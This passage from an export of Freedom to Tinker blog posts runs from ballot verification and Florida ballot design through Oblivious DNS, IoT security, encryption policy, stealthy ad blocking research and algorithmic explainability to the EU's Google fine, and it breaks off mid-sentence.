a presidential race on the top of the ticket; or state legislator) and most voters won’t notice. Those who do notice can ask to try again on the touchscreen, and a cleverly hacked BMD will make sure not to cheat the same voter again. In summary, “Can voters effectively verify their machine-marked ballots?” No. “Do voters try to verify their machine-marked ballots?” No. As DeMillo et al. write, “Given the extent to which test subjects are known . . . to agree with an authoritative-sounding description of events that never happened, the use of recall in [BMD-marked ballots] deserves further evaluation. . . . The [BMD-marked ballot] is not a reliable document for post-election audits.” And therefore, voters should mark optical-scan bubbles on their paper ballot, with a pen. References What Voters are Asked to Verify Affects Ballot Verification: A Quantitative Analysis of Voters’ Memories of Their Ballots, by Richard DeMillo, Robert Kadel, and Marilyn Marks, SSRN abstract 3292208, November 2018. There is also related work on whether voters notice changes on the “review screens” of touchscreen DRE voting machines. That’s not quite the same thing, because a hacked DRE can also cheat on its review screen. Still, the related work also finds that voters are not very good at noticing errors: The Usability of Electronic Voting Machines and How Votes Can Be Changed Without Detection, by Sarah P. Everett, PhD Thesis, Rice University, 2007. Now do voters notice review screen anomalies? a look at voting system usability. By Bryan A. Campbell and Michael D. Byrne, in 2009 USENIX/ACCURATE Electronic Voting Technology Workshop/Workshop on Trustworthy Elections (EVT/WOTE) (Montreal, Canada, 2009). Broken Ballots: Will Your Vote Count?, (section 5.6) by Douglas W. Jones and Barbara Simons, CSLI Publications, 2012. The Vote-o-graph: Experiments with Touch Screen Voting, by Douglas W. Jones, 2011."
"172","2018-11-14","2023-03-24","https://freedom-to-tinker.com/2018/11/14/florida-is-the-florida-of-ballot-design-mistakes/","Well designed ballot layouts allow voters to make their intentions clear; badly designed ballots invite voters to make mistakes. This year, the Florida Senate race may be decided by a misleading ballot layout—a layout that violated the ballot design recommendations of the Election Assistance Commission. In Miami Palm Beach, Florida in the year 2000, the badly designed “butterfly ballot” misled over 2000 voters who intended to vote for Al Gore, to throw away their vote. (That’s a strong statement, but it’s backed up by peer-reviewed scientific analysis.) In Sarasota, Florida in the year 2006, in a Congressional race decided by 369 votes, over 18,000 voters failed to vote in that race, almost certainly because of a badly designed touch-screen ballot layout. In Broward County, Florida in the year 2018, it appears that a bad optical-scan ballot design caused over 26,000 voters to miss voting in the Senate race, where the margin of victory (as of this writing, not yet final) is 12,562 votes. Back in 2000, many Miami voters wishing to vote for the second candidate down the left-hand side, punched the second hole down; that hole was officially a vote for right-wing candidate Pat Buchanan. (Although the butterfly ballot got all the attention, other ballot-design flaws in Florida 2000 in five other counties probably caused 6700 lost presidential votes as well, according to Professor Douglas W. Jones of the University of Iowa.) Back in 2006, the Sarasota touch-screen machines showed one contest per page, like this: But on one of the pages, two different contests were listed: At top there is the 2-candidate race between Vern Buchanan (REP) and Christine Jennings (DEM), and at bottom there is a 6-candidate race for Governor. The bottom race is more prominent in two ways: it occupies more space, and it has a boldface, blue-background heading, STATE. You might think, “I’d never miss that!” and there’s an 86% chance that you’re right, which is to say, about 14.9% of the voters did undervote in the top race, where the normal undervote rate for congressional races is about 1.2%. From this fiasco came a very simple principle of touch-screen ballot design: if you’re going to put only one contest per page, then stick to only one contest per page! And perhaps, don’t let voters move to the next page if there’s an undervote on this page, unless they indicate in a positive way that they wish to undervote. The 2018 Senate race in Broward County This year in Broward County, the optical-scan ballot looks like this. The race for Senate is hidden in plain sight at bottom left, just under the instructions in English, the instructions in Spanish, and the instructions in Creole. Those of you who don’t read Creole very fluently might stop reading at that point, and skip to the top of the middle column. In that case, you’d be in danger of undervoting in the Senate race. The most official stylebook in the United States for designing optical-scan ballots is the 2007 publication of the Election Assistance Commission, Effective Designs for the Administration of Federal Elections, Section 3: Optical scan ballots. The EAC’s publication uses this ballot as an example: The Broward ballot violates these EAC guidelines: §3.11 “Ballot instructions, running either vertically or horizontally, must be self-contained and separated from contest data. Vertical instruction treatments cannot share column space with contests—test voters often overlooked races located immediately beneath vertical instructions.” This is the smoking gun. The Broward County Supervisor of Elections, Brenda Snipes, did not follow simple and clear guidelines from an Election Assistance Commission document that must surely be required reading for anyone in this country designing optical-scan ballots. §3.3 “Use one language per ballot . . . display no more than two languages simultaneously.” This made a difference! note that in neighboring Miami, where the op-scan ballot displayed shorter instructions in only two languages, with the first contest starting below that in the first column, there were far fewer undervotes. §3.11 “apply color only to instructions.” The EAC ballot’s instruction block has a light blue background, whereas Broward’s instruction background-fill was the same as the contests. By the way, if you’re not sure which party those 26,000 voters might have intended to vote for in the Senate race, look again at Broward ballot. In the race right below the Senate race, one party didn’t even nominate a candidate to run in that Congressional district."
"173","2017-12-19","2023-03-24","https://freedom-to-tinker.com/2017/12/19/how-have-in-flight-web-page-modification-practices-changed-over-the-past-ten-years/","When we browse the web, there are many parties and organizations that can see which websites we visit, because they sit on the path between web clients (our computers and mobile devices), and the web servers hosting the sites we request. Most obviously, Internet Service Providers (ISPs) are responsible for transmitting our web traffic, but reports (e.g. [1], [2], [3]) have shown that they may also inject ads into users’ requested web pages to increase revenue. Other parties may also intercept our web traffic for a wide variety of reasons: content-distribution networks (or CDNs) receive requests for websites that are geographically farther away to speed up response time, enterprise software and programs running on our devices may check incoming websites for added security or privacy before passing the website to our browser, and malicious adversaries may attempt to inject malware into requested web content before we receive it. In 2007, a research group at the University of Washington conducted a study to measure how often these web page modifications occur in practice, and to determine who is responsible for the modifications. Web page modifications were identified using a small piece of software embedded in a test web page, a so-called “web tripwire”, that compared a known good representation of the web page with the version of the test web page users saw in their browsers. The researchers then attributed the modifications to ISPs, malicious attackers, and client software such as ad blockers, using IP addresses and by finding identifying keywords in the injected web content. They found that only about 1.3% of participating web clients saw page modifications. But much about how we interact with and browse the web has changed over the past ten years. More specifically, with the emergence of mobile technologies and new network parties such as CDNs, it is important to learn if and how these new developments have affected in-flight modification practices. We invite you to take part in our research study. Following the same setup as the UW study, we have created a test web page containing a “web tripwire”. If it detects any in-flight page modifications in our test page, it sends us a copy of the modified version of our web page that your browser received. We minimize the information that we collect to detect page modifications. In addition to page modification data, we only record information that web servers normally record, such as IP address, browser type, date and time of page request, and a cookie to differentiate between users. We will permanently remove any personal information found in the page modifications before sending the modification data to our servers. By participating in this study, you are helping us gather information crucial for guiding research and building tools to improve web privacy. If you’re willing to contribute to our study, it’s as simple as visiting our test web page: http://stormship.cs.princeton.edu. If possible, we also ask you to visit our page through multiple different devices and browsers, as this will help diversify our collected data. Our test page contains more details about our study, and we will post our results there when we have completed our measurements. Please reach out to Annie Edmundson or Marcela Melara with any questions, concerns, or feedback. We greatly appreciate your help in our efforts to improve web privacy!"
"174","2018-04-02","2023-03-24","https://freedom-to-tinker.com/2018/04/02/a-privacy-preserving-approach-to-dns/","by Annie Edmundson, Paul Schmitt, Nick Feamster The recent news that Cloudflare is deploying their own DNS recursive resolver has once again raised hopes that users will enjoy improved privacy, since they can send DNS traffic encrypted to Cloudflare, rather than to their ISP. In this post, we explain why this approach only moves your private data from the ISP to (yet another) third party. You might trust that third party more than your ISP, but you still have to trust them. In this post, we present an alternative design—Oblivious DNS—that prevents you from having to make that choice at all. The Domain Name System (DNS) When your client turns a domain name like google.com into an IP address, it relies on a recursive DNS resolver to do so. The operator of that resolver sees both your IP address and the domains that you query. When you—or any of your devices—accesses the Internet, the first step is typically to look up a domain name (e.g., “google.com”, “princeton.edu”) in the Domain Name System (DNS) to determine which Internet address to contact. The DNS is, in essence a phone book for the Internet’s domain names. Clients that you operate—including your browser, your smartphone, and any IoT device in your home—sends a DNS query for each domain name to a so-called “recursive DNS resolver”.On a typical home network, the default recursive DNS resolver may be operated by your Internet service provider (ISP) (e.g., Comcast, Verizon). Other entities such as Google and Quad9 also operate “open” recursive resolvers that anyone can use, with the idea that these alternative recursive resolvers give users another option for resolving DNS queries other than their ISP. Such alternatives have been useful in the past for circumventing censorship. DNS: The Internet’s Biggest Privacy Hole DNS queries are typically sent in cleartext, and they can reveal significant information that an Internet user may want to keep private, including the websites that user is visiting, the IP address or subnet of the device that issued the initial query, and even the types of devices that a user has in his or her home network. For example, our previous research has shown that DNS lookups can be used to de-anonymize traffic from the Tor network. Because the queries and responses are unencrypted, any third party who can observe communication between a client and a recursive resolver, a recursive resolver, or an authoritative server may also be able to observe various steps in the DNS resolution process. Operators of recursive DNS resolvers—typically your ISP, but typically whoever the user relies on to resolve recursive DNS queries (e.g., Google) may see individual IP addresses (which may correspond to an ISP subscriber, or perhaps an individual end-device) coupled with the fully qualified domain name that accompanies the query. Even in the case of authoritative resolvers, extensions to DNS such as EDNS0 Client Subnet may reveal information about the user’s IP address or subnet to authoritative DNS servers higher in the DNS hierarchy. Existing Approaches Existing proposed standards, including DNS Query Name Minimization and DNS over TLS protect certain aspects of user privacy. Yet, these approaches do not prevent the operator of the recursive DNS server from learning which IP addresses are issuing queries for particular domain names—the fundamental problem with DNS privacy: DNS Query Name Minimization provides a mechanism that the DNS servers that are authoritative for different parts of the DNS name hierarchy would not learn about the full DNS query. For example, a server that is authoritative for all of *.com would not necessarily learn about a query for maps.google.com, but would only learn that a client needs to resolve some subdomain of google.com. Yet, this mechanism doesn’t prevent the recursive DNS resolver from learning the full DNS query and the IP address of the client that issued the query. DNS over TLS provides a mechanism for encrypting DNS queries. Yet, even with DNS over TLS, the recursive resolver still needs to decrypt the initial query so that it can resolve the query for the client. It still does not prevent the recursive DNS resolver from learning the query and the IP address that send the query. Third parties have recently been standing up new DNS resolvers that claim to respect user privacy: Quad9 (9.9.9.9) and Cloudflare’s 1.1.1.1 operate such open DNS recursive resolvers that claim to purge information about user queries. Cloudflare additionally support DNS over HTTPS, which (like DNS over TLS) will ensure that your DNS queries are encrypted from your browser to its recursive DNS resolver. Yet, in all of these cases, a user has no guarantee that information that an operator learns might be retained, for operational or other purposes. Once such information is retained, of course, it may become vulnerable to other threats to user privacy, including data requests from law enforcement. In short, these services transfer the point of trust from your ISP to some other third party, but you still have to trust that third party. Oblivious DNS While you may have good reason to trust a provider that claims to purge all information about your DNS queries, we believe that user’s shouldn’t even have to make that choice in the first place. The goal of Oblivious DNS (ODNS) is to ensure that no single party observes both the DNS query and the IP address (or subnet) that issued the query. ODNS runs as an overlay of sorts on conventional DNS; it requires no changes to any DNS infrastructure that is already deployed. Oblivious DNS (ODNS) adds a custom stub resolver at the client to obfuscate the original query, which the authoritative server for ODNS can decrypt. But, the ODNS authoritative server never sees the IP address of the client that issued the query. Oblivious DNS (ODNS) operates similarly to conventional DNS, but has two new components: 1) each client runs a local ODNS stub resolver, and 2) we add an ODNS authoritative zone that also operates as a recursive DNS resolver. The figure illustrates the basic approach. When a client application initiates a DNS lookup, the client’s stub resolver obfuscates the domain that the client is requesting (via symmetric encryption), resulting in the recursive resolver being unaware of the requested domain. The authoritative name server for ODNS separates the clients’ identities from their corresponding DNS requests, such that the name servers cannot learn who is requesting specific domains. The steps taken in the ODNS protocol are as follows: When the client generates a request for www.foo.com, its stub resolver generates a session key k, encrypts the requested domain, and appends the TLD domain .odns, resulting in {www.foo.com}k.odns. The client forwards this request, with the session key encrypted under the .odns authoritative server’s public key ({k}PK) in the “Additional Information” record of the DNS query to the recursive resolver, which then forwards it to the authoritative name server for .odns. The authoritative server for ODNS queries decrypts the session key with its private key and subsequently decrypts the requested domain with the session key. The authoritative server forwards a recursive DNS request to the appropriate name server for the original domain, which then returns the answer to the ODNS authoritative server. The ODNS authoritative server can thus return the answer (with both the domain and IP address encrypted) to the recursive resolver, which forwards it on to the client’s stub resolver. In turn, the stub resolver can decrypt both the domain and the IP address. Other name servers see incoming DNS requests, but these only see the IP address of the ODNS recursive resolver, which effectively proxies the DNS request for the original client. These steps correspond to the following figure. Prototype Implementation and Preliminary Evaluation We implemented a prototype in Go to evaluate the feasibility of deploying ODNS, as well as the performance costs of using ODNS as compared to conventional DNS. We implemented an ODNS stub resolver and implemented an authoritative name server that can also issue recursive queries. ODNS adds 10-20 milliseconds to the resolution time for an uncached DNS query. We first compared the performance of running an ODNS query overhead to that of conventional DNS. We issued DNS queries to the Alexa Top 10,000 domains using both ODNS and conventional DNS. The CDF below shows that ODNS adds about 10-20 milliseconds to each query. Of course, in practice DNS makes extensive use of caching, and this experiment shows a worst-case scenario. We expect the overhead in practice to be much smaller. Along these lines, we also measured how ODNS would affect a typical Internet user’s browsing experience by evaluating the overhead of a full web page load, which involves fetching the page, and conducting any subsequent DNS lookups for embedded objects and resources in the page. We fetched popular web pages that have a lot of content using ODNS and compared the results to performing the same operations with ODNS. Overhead for loading an entire web page is minimal. In each group in the bar plot, the left bar in the figure is using conventional DNS and the right bar represents the time it takes using ODNS. We see that there is no significant difference in page load time between ODNS and conventional DNS because DNS lookups contribute minimal overhead to the entire page load process. As before, these experiments were run with a “cold cache”, and in practice we expect the overhead to be even less. Summary and Next Steps The past several years have seen much (warranted) concerns over the privacy risks that DNS queries expose. Existing approaches that allow users to use alternative DNS resolvers are a helpful step, but in some sense they merely shift the trust from the user’s ISP to another party. We believe that a better end state is one where the user doesn’t have to place trust in the operator of any DNS recursive resolver. Towards this goal, we have built ODNS to help decouple clients’ identities with their corresponding DNS queries, and have implemented a prototype. As ongoing work, we are working on a larger-scale implementation, deployment and evaluation. Additional information on ODNS can be found at our project website. We welcome any feedback and comments. We are ready to explore opportunities for broader deployment, and we are actively seeking partners to help us deploy ODNS resolvers in operational settings."
"175","2017-01-30","2023-03-24","https://freedom-to-tinker.com/2017/01/30/concerned-about-internet-of-things-security/","There is no shortage of warnings about the need to improve security for the Internet of Things: The Guardian asks “Can we secure the internet of things in time to prevent another cyber-attack?”. The New York Times calls for “Stepping up Security for an Internet of Things world”. Technology Review reports that Security Experts Warn Congress That the Internet of Things Could Kill People”. Fortune outlines Why Businesses Need to Secure Connected Devices to Win Consumer Trust”. After the (at the time) record distributed denial of service attack, Brian Krebs analyzes “Who Makes the IoT Things Under Attack?”. Certainly these messages must be raising concerns in organizations that are working on Internet of Things projects. But it doesn’t seem so. In our recent research at MIT Sloan Management Review, we found that only 34% of the respondents felt that they needed to improve their IoT data security. If you are trying to decide if the glass is full or empty, that glass seems two-thirds empty to me. The research included responses from 1,480 executives, managers, and IT professionals working in a wide variety of industries. It focused on the perspective of organizations, not security professionals, and tried to understand their challenges and opportunities associated with the Internet of Things. One optimistic interpretation of these results is that the reason the 66% are not concerned about IoT data security is that they have heeded the warnings and have taken steps to reduce security concerns. But we also asked respondents about how effective their organizations were at security for IoT data. Figure 1 shows the relationship between concern for IoT data security and the organization’s perceived data security effectiveness. Reporting of a need to improve IoT security changed little with the perceived effectiveness. Figure 1: Concern for IoT Security and IoT Security Effectiveness An alternative, more pessimistic interpretation is that organizations need to improve IoT security, but that it is not an important concern. Instead, in order to take advantage of IoT, respondents felt more need to improve their overall analytics capability (58%), analytics talent (52%), IoT specific talent (49%), executive team’s understanding (46%), ability to communicate with customers (45%), and relationships with other groups who understand IoT (40%). In fact, need for improvements in data security (34%) and sensor-data security (27%) were selected less often than any other option we gave respondents to choose from. And in this scenario, respondents could select as many as they felt described their organization, without cost. Our respondents had a variety of experience with IoT projects. It could be that those who are not active may not yet be aware of potential security issues. Given that most organizations are not yet active with IoT projects, our results could be driven by those inactive organizations. Figure 2 examines organizational concern for IoT data a security as they gain experience with IoT. Concern is higher for organizations active with IoT with some drop as they gain further experience. But it seems that inactive organizations are not solely responsible for the low overall need to improve IoT data security. Figure 2: Concern for IoT Security and IoT Experience While IoT security is inherently important, it may be even more salient when combined with another key result from our research—business value from the Internet of Things is related to the amount of data sharing between customers, suppliers, and even competitors. As organizations find value in sharing data with other organizations, they are likely to increase connections with other organizations, leading to increased potential for negative externalities. Unfortunately, the low perception of need to improve IoT data security coupled with increased IoT deployments and interconnections between organizations seem likely to lead to more headlines that report on IoT security downfalls, not fewer."
"176","2017-02-28","2023-03-24","https://freedom-to-tinker.com/2017/02/28/how-the-politics-of-encryption/","I wrote yesterday about reports that people in the White House are using encrypted communication apps more often, and why that might be. Today I want to follow up by talking about how the politics of encryption might affect government agencies’ choices about how to secure their information. I’ll do this by telling the stories of the CIOs of three hypothetical Federal agencies. Alice is CIO of Agency A. Her agency’s leader has said in speeches that encryption is a tool of criminals and terrorists, and that encryption is used mostly to hide bad or embarrassing acts. Alice knows that if she adopts encryption for the agency, her boss could face criticism for hypocrisy, for using the very technology that he criticizes. Even if there is evidence that encryption will make Agency A more secure, there is a natural tendency for Alice to look for other places to try to improve security instead. Bob is CIO of Agency B. His agency’s leader has taken a more balanced view, painting encryption as a tool with broad value for honest people, and which happens to be used by bad people as well. Bob will be in a better position than Alice to adopt encryption if he thinks it will improve his agency’s security. But he might hesitate a bit to do so if Agencies A and B need to work together on other issues, or if the two agency heads are friends–especially if encryption seems more important to the head of Agency A than it does to the head of Bob’s own agency. Charlie is CIO of Agency C. His agency’s leader hasn’t taken a public position on encryption, but the leader is known to be impulsive, thin-skinned, and resistant to advice from domain experts. Charlie worries that if he starts deploying encryption in his agency, and then the leader impulsively takes a strong position against encryption without consulting his team, the resulting accusations of hypocrisy could anger the leader. That might cost Charlie his job, or seriously undermine the authority he needs to properly manage agency IT. The safe thing for Charlie to do is to avoid deploying encryption–not only to preserve his job but also to protect the rest of the agency’s IT agenda. If Charlie doesn’t change the agency’s practice, then criticism of the practice can be deflected onto the previous leader–and of course we’ll be upgrading to the better practice soon. Here the uncertainty created by the leader’s management style deters Charlie from changing encryption practice. Let’s recap. Alice, Bob, and Charlie are operating in different environments, but in all three cases, the politics of encryption are deterring them, at least a little, from deploying encryption. Their decision to deploy it or not will depend not only on their best judgment as to whether it will improve the agency’s security, but also on political factors that raise the cost of adopting encryption. And so their agencies may not make enough use of encryption. This is yet another reason we need a serious and specific discussion about encryption policy."
"177","2017-03-29","2023-03-24","https://freedom-to-tinker.com/2017/03/29/questions-for-the-fbi-on-encryption-mandates/","I wrote on Monday about how to analyze a proposal to mandate access to encrypted data. FBI Director James Comey, at the University of Texas last week, talked about encryption policy and his hope that some kind of exceptional access for law enforcement will become available. (Here’s a video.) Let’s look at what Director Comey said about how a mandate might work. Here is an extended quote from Director Comey’s answer to an audience question (starting at 51:02 in the video, emphasis added): The technical thing, look, I really do think we haven’t given this the shot it deserves. President Obama commissioned some work at the end of his Administration because he’d heard a lot from people on device encryption, [that] it’s too hard. [No], it’s not too hard. It’s not too hard. It requires a change in business model but it is, according to experts inside the U.S. government and a lot of people who will meet with us privately in the private sector, no one actually wants to be seen with us but we meet them out behind the 7/11, they tell us, look, it’s a business model decision. Take the FBI’s business model. We equip our agents with mobile devices that I think are great mobile devices and we’ve worked hard to make them secure. We have designed it so that we have the ability to access the content. And so I don’t think we have a fatally flawed mobile system in the FBI, and I think nearly every enterprise that is represented here probably has the same. You retain the ability to access the content. So look, one of the worlds I could imagine, I don’t know whether this makes sense, one of the worlds I could imagine is a requirement that if you’re going to sell a device or market a device in the United States, you must be able to comply with judicial process. You figure out how to do it. And maybe that doesn’t make sense, absent an international component to it, but I just don’t think we, and look, I get it, the makers of devices and the makers of fabulous apps that are riding on top of our devices, on top of our networks, really don’t have an incentive to deal with, to internalize the public safety harm. And I get that. My job is to worry about public safety. Their job is to worry about innovating and selling more units, I totally get that. Somehow we have to bring together, and see if we can’t optimize those two things. And really, given my role, I should not be the one to say, here’s what the technology should look like, nor should they say, no I don’t really care about that public safety aspect. And what I don’t want to have happen, and I know you agree with me no matter what you think about this, now I think you’re going to agree with what I’m about to say, is we can’t have this conversation after something really bad happens. And look, I don’t want to be a pessimist, but bad things are going to happen. And even I, the Director of the FBI, do not believe that we can have thoughtful conversations about optimizing things we care about in the wake of a serious, serious attack of any kind. The bolded text is the closest Director Comey came to describing how he imagines a mandate working. He doesn’t suggest that it’s anything like a complete proposal–and anyway that would be too much to ask from an off-the-cuff answer to an audience question. But let’s look at what would be required to turn it into a proposal that can be analyzed. In other words, let’s extrapolate from Director Comey’s answer and try to figure out how he and his team might try to build out a specific proposal based on what he suggested. The notional mandate would apply at least to retailers (“if you’re going to sell … or market a device”) who sell smartphones to the public “in the United States.” That would include Apple (for sales in Apple Stores), big box retailers like Best Buy, mobile phone carriers’ shops, online retailers like Amazon, and the smaller convenience stores and kiosks that sell cheap smartphones. Retailers would be required “comply with judicial process.” At a minimum, that would presumably mean that if presented with a smartphone that they had sold, they could extract from it any data encrypted by the user. Which data, and under what circumstances? That would have to be specified, but it’s worth noting that there is a limited amount the retailer can do to control how a user encrypts data on the device. So unless we require retailers to prevent the installation of new software onto the device (and thereby put app stores, and most app sellers, out of business), there would need to be major carve-outs to limit the mandate’s reach to include only cases where the retailer had some control. For example, the mandate might apply only to data encrypted by the software present on the device at the time of sale. That could create an easy loophole for users who wanted to prevent extraction of their encrypted data (by installing encryption software post-sale), but at least it would avoid imposing an impossible requirement on the retailer. (Veterans of the 1990s crypto wars will remember how U.S. software products often shipped without strong crypto, to comply with export controls, but post-sale plug-ins adding crypto were widely available.) Other classes of devices, such as laptops, tablets, smart devices, and server computers, would either have to be covered, with careful consideration of how they are sold and configured, or they would be excluded, limiting the coverage of the rule. There would need to be rules about devices brought into the United States by their user-owners, or if those devices were not covered, then some law enforcement value would be lost. And the treatment of used devices would have to be specified, including both devices made before the mandate took effect (which would probably need to be exempted, creating another loophole) and post-mandate devices re-sold by a user of merchant: would the original seller or the re-seller be responsible, and what if the reseller is an individual? Notice that we had to make all of these decisions, and face the attendant unpleasant tradeoffs, before we even reached the question of how to design the technical mechanism to implement key escrow, and how that would affect the security and privacy interests of law-abiding users. The crypto policy discussion often gets hung up on this one issue–the security implications of key escrow–but it is far from the only challenge that needs to be addressed, and the security implications of a key escrow mechanism are far from the only potential drawbacks to be considered. Director Comey didn’t go to Austin to present an encryption mandate proposal. But if he or others do decide to push seriously for a mandate, they ought to be able to lay out the details of how they would do it."
"178","2017-04-14","2023-03-24","https://freedom-to-tinker.com/2017/04/14/the-future-of-ad-blocking/","There’s an ongoing arms race between ad blockers and websites — more and more sites either try to sneak their ads through or force users to disable ad blockers. Most previous discussions have assumed that this is a cat-and-mouse game that will escalate indefinitely. But in a new paper, accompanied by proof-of-concept code, we challenge this claim. We believe that due to the architecture of web browsers, there’s an inherent asymmetry that favors users and ad blockers. We have devised and prototyped several ad blocking techniques that work radically differently from current ones. We don’t claim to have created an undefeatable ad blocker, but we identify an evolving combination of technical and legal factors that will determine the “end game” of the arms race. Our project began last summer when Facebook announced that it had made ads look just like regular posts, and hence impossible to block. Indeed, Adblock Plus and other mainstream ad blockers have been ineffective on Facebook ever since. But Facebook’s human users have to be able to tell ads apart because of laws against misleading advertising. So we built a tool that detects Facebook ads the same way a human would, deliberately ignoring hidden HTML markup that can be obfuscated. (Adblock Plus, on the other hand, is designed to be able to examine only the markup of web pages and not the content.) Our Chrome extension has several thousand users and continues to be effective. We’ve built on this early success. Laws against misleading advertising apply not just on Facebook, but everywhere on the web. Due to these laws and in response to public-relations pressure, the online ad industry has developed robust self-regulation that standardizes the disclosure of ads across the web. Once again, ad blockers can exploit this, and that’s what our perceptual ad blocker does. [1] The second prong of an ad blocking strategy is to deal with websites that try to detect (and in turn block) ad blockers. To do this, we introduce the idea of stealth. The only way that a script on a web page can “see” what’s drawn on the screen is to ask the user’s browser to describe it. But ad blocking extensions can control the browser! Not perfectly, but well enough to get the browser to convincingly lie to the web page script about the very existence of the ad blocker. Our proof-of-concept stealthy ad blocker successfully blocked ads and hid its existence on all 50 websites we looked at that are known to deploy anti-adblocking scripts. Finally, we have also investigated ways to detect and block the ad blocking detection scripts themselves. We found that this is feasible but cumbersome; at any rate, it is unnecessary as long as stealthy ad blocking is successful. The details of all these techniques get extremely messy, and we encourage the interested reader to check out the paper. While some of the details may change, we’re confident of our long-term assessment. That’s because our techniques are all based on sound computer security principles and because we’ve devised a state diagram that describes the possible actions of websites and ad blockers, bringing much-needed clarity to the analysis and helping ensure that there won’t be completely new techniques coming out of left field in the future. There’s a final wrinkle: the publishing and advertising industries have put forth a number of creative reasons to argue that ad blockers violate the law, and indeed Adblock Plus has been sued several times (without success so far). We carefully analyzed four bodies of law that may support such legal claims, and conclude that the law does not stand in the way of deploying sophisticated ad blocking techniques. [2] That said, we acknowledge that the ethics of ad blocking are far from clear cut. Our research is about what can be done and not what should be done; we look forward to participating in the ethical debate. This post was edited to update the link to the paper to the arXiv version (original paper link). [1] To avoid taking sides on the ethics of ad blocking, we have deliberately stopped short of making our proof-of-concept tool fully functional — it is configured to detect ads but not actually block them. [2] One of the authors is cyberlaw expert Jonathan Mayer."
"179","2017-05-31","2023-03-24","https://freedom-to-tinker.com/2017/05/31/what-does-it-mean-to-ask-for-an-explainable-algorithm/","One of the standard critiques of using algorithms for decision-making about people, and especially for consequential decisions about access to housing, credit, education, and so on, is that the algorithms don’t provide an “explanation” for their results or the results aren’t “interpretable.” This is a serious issue, but discussions of it are often frustrating. The reason, I think, is that different people mean different things when they ask for an explanation of an algorithm’s results. Before unpacking the different flavors of explainability, let’s stop for a moment to consider that the alternative to algorithmic decisionmaking is human decisionmaking. And let’s consider the drawbacks of relying on the human brain, a mechanism that is notoriously complex, difficult to understand, and prone to bias. Surely an algorithm is more knowable than a brain. After all, with an algorithm it is possible to examine exactly which inputs factored in to a decision, and every detailed step of how these inputs were used to get to a final result. Brains are inherently less transparent, and no less biased. So why might we still complain that the algorithm does not provide an explanation? We should also dispense with cases where the algorithm is just inaccurate–where a well-informed analyst can understand the algorithm but will see it as producing answers that are wrong. That is a problem, but it is not a problem of explainability. So what are people asking for when they say they want an explanation? I can think of at least four types of explainability problems. The first type of explainability problem is a claim of confidentiality. Somebody knows relevant information about how a decision was made, but they choose to withhold it because they claim it is a trade secret, or that disclosing it would undermine security somehow, or that they simply prefer not to reveal it. This is not a problem with the algorithm, it’s an institutional/legal problem. The second type of explainability problem is complexity. Here everything about the algorithm is known, but somebody feels that the algorithm is so complex that they cannot understand it. It will always be possible to answer what-if questions, such as how the algorithm’s result would have been different had the person been one year older, or had an extra $1000 of annual income, or had one fewer prior misdemeanor conviction, or whatever. So complexity can only be a barrier to big-picture understanding, not to understanding which factors might have changed a particular person’s outcome. The third type of explainability problem is unreasonableness. Here the workings of the algorithm are clear, and are justified by statistical evidence, but the result doesn’t seem to make sense. For example, imagine that an algorithm for making credit decisions considers the color of a person’s socks, and this is supported by unimpeachable scientific studies showing that sock color correlates with defaulting on credit, even when controlling for other factors. So the decision to factor in sock color may be justified on a rational basis, but many would find it unreasonable, even if it is not discriminatory in any way. Perhaps this is not a complaint about the algorithm but a complaint about the world–the algorithm is using a fact about the world, but nobody understands why the world is that way. What is difficult to explain in this case is not the algorithm, but the world that it is predicting. The fourth type of explainability problem is injustice. Here the workings of the algorithm are understood but we think they are unfair, unjust, or morally wrong. In this case, when we say we have not received an explanation, what we really mean is that we have not received an adequate justification for the algorithm’s design. The problem is not that nobody has explained how the algorithm works or how it arrived at the result it did. Instead, the problem is that it seems impossible to explain how the algorithm is consistent with law or ethics. It seems useful, when discussing the explanation problem for algorithms, to distinguish these four cases–and any others that people might come up with–so that we can zero in on what the problem is. In the long run, all of these types of complaints are addressable–so that perhaps explainability is not a unique problem for algorithms but rather a set of commonsense principles that any system, algorithmic or not, must attend to."
"180","2017-06-28","2023-03-24","https://freedom-to-tinker.com/2017/06/28/european-authorities-fine-google-for-search-tactics/","This week the European Commission (EC) announced that it is fining Google $2.7 billion for anti-competitive tactics in the company’s iconic search product. In this post I’ll unpack what’s going on here. I have some background on this topic. In 2011-12, when I was Chief Technologist at the FTC, the agency did a big investigation on this same topic. The FTC eventually decided not to bring a case against Google for this behavior. The EC has now reached a different conclusion. The EC makes two main claims. First, they claim that Google dominates the search engine market in Europe–it’s pretty hard to argue with that. Second, they claim Google designed its dominant search product in ways that unfairly advantage the company’s own Google Shopping product and unfairly disadvantage competing comparison shopping products. Competition law is complicated, and I won’t presume to offer any legal analysis. But the basic principles motivating competition policy are not too complicated. Fair competition is encouraged. If your business grows because you improve your product, or manage your operations well, or negotiate shrewdly, or simply happen to be in the right place at the right time, that’s all good. If you amass dump trucks full of money doing this, then good for you, and thank you for your tax dollars. That’s how capitalism is supposed to work. But if your effort is devoted to preventing fair competition, then you are probably harming consumers, and that’s a competition policy problem. To see the difference, suppose you’re in the business of delivering packages to people’s homes. Fair competition means buying better trucks, optimizing routes and schedules, hiring better employees, and so on. But if you send out employees to block your competitors’ trucks, that is an anticompetitive tactic. Now back to Google. The EC says that when users do searches relevant to shopping, Google gives its own Google Shopping product preferred placement in the search results–and higher placement leads to more clicks and more sales–while demoting competing shopping products in the search results. These two claims, self-promotion and competitor-demotion, may sound similar at first, but they raise different issues for us in understanding the case, so let’s look at them separately. On the self-promotion claim, we know the relevant facts. On shopping-relevant searches, Google puts a box at or near the top of the search results, showing Google Shopping results with images of items for sale. That is a valuable benefit that Google Search is giving to the Google Shopping product. Is this anticompetitive? Google’s strongest argument to the contrary is that the Shopping box is essentially an ad, and Google already places ads at the top of the page. If Google auctioned that space off to the highest bidder for advertising, nobody would object. So why is it a problem if Google gives that advertising space to Google Shopping? The company could make a symbolic payment to itself to buy the space, if that made a difference to anybody. The competitor-demotion claim is very different–the theory is less complicated, but the analysis depends more on facts not available to the public. If Google is gratuitously demoting its shopping competitors in search results, that is problematic. But Google says it is not doing that–it says that those competitors’ placements arise naturally from a search ranking algorithm based on design decisions that the company made for legitimate, pro-consumer reasons. It’s hard for the public to tell who is right. Google’s ranking algorithm is complicated, and it changes constantly, as the Web changes and as Google works to counter sites’ attempts to game the algorithm. Is there evidence that Google tweaked the algorithm with the goal of demoting shopping competitors? Did the company make algorithm changes for the wrong reasons, or did suspicious changes happen outside the normal process? These questions are answerable in principle, but only by looking at the company’s internal information, which the EC might have but we, the public, do not. At this point, I need to put some of my cards on the table and admit that I know more about this topic, having worked on the FTC’s investigation which asked some of the same questions. But that investigation was confidential, for good reasons, and I will not violate that confidentiality. All I’ll say is that the 